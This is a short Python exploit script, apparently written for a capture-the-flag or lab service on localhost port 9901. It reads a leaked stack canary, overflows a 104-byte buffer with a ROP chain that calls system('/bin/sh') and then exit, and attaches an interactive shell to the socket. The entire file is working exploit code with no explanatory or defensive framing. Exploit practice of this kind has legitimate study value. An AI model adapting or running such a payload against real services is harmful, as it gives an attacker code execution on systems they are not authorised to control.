#!/usr/bin/env python

import socket
import struct

from telnetlib import Telnet

host = "127.0.0.1"
port = 9901

p64 = lambda x: struct.pack("<Q", x)

def main():

    s = socket.socket()
    s.connect((host, port))

    canary = int(s.recv(16), 16)

    rop = [
        p64(canary),             # stack protector
        p64(0x4242424242424242), # ebp

        # calling system
        p64(0x7ffff7edaa3d),     # pop rdi
        p64(0x7ffff7f66962),     # bin_sh
        p64(0x7ffff7e24120),     # system

        # calling exit
        p64(0x7ffff7edaa3d),     # pop rdi
        p64(0x0),                # to exit cleanly
        p64(0x7ffff7e19820),     # exit
    ]

    payload = b"A" * 104 + b"".join(rop)
    s.send(payload)

    t = Telnet()
    t.sock = s
    t.interact()

    s.close()


if __name__ == "__main__":
    main()
